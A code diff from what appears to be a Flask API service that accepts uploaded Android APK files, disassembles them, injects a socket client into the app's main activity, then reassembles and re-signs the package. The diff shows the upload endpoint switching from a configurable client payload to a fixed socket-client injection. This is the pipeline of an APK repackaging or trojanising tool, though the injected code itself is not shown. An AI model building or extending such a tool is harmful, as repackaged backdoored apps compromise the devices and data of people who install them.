@@ -9,15 +9,14 @@ from api.restplus import api
 
 from utils.utils_func import is_apk, save_apk, generate_name, do_json
 from utils.disas import disassemble, reassemble, sign
-from utils.modify import get_main_activity, get_package, add_permission, mainActivity_modifier, add_socket_client, check_main_activity_name
+from utils.modify import mainActivity_socket_client
 from utils.query import get_last_injection, query
 
-ns = api.namespace('first', description='boh')
+ns = api.namespace('second', description='boh')
 
 upload_parser = ns.parser()
 upload_parser.add_argument('file', location='files', type=FileStorage, required=True)
 upload_parser.add_argument('injection', type=int, location='form', required=True)
-upload_parser.add_argument('client', type=str, location='form')
 
 
 @ns.route('/upload/')
@@ -29,14 +28,13 @@ class Upload(Resource):
         if is_apk(uploaded_file.filename):
 
             injection = args['injection']
-            client_payload = args['client']
             save_apk(uploaded_file)
 
             uploaded_file.filename = generate_name(uploaded_file)
             print('The name is:' + uploaded_file.filename)
-            disassemble(uploaded_file)
 
-            mainActivity_modifier(uploaded_file, injection, client_payload)
+            disassemble(uploaded_file)
+            mainActivity_socket_client(uploaded_file, injection)
             reassemble(uploaded_file)
             sign(uploaded_file)
             return do_json('ok', uploaded_file, injection), 200
